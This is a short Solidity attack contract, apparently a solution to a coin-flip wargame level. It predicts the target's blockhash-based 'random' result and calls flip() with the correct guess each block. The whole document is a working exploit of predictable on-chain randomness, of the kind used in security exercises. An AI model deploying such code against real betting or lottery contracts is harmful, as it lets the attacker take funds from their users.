pragma solidity ^0.8.10;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function coinFlipGuess(address _coinFlipAddr) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            ICoinFlip(_coinFlipAddr).flip(true);
        } else {
            ICoinFlip(_coinFlipAddr).flip(false);
        }
    }
}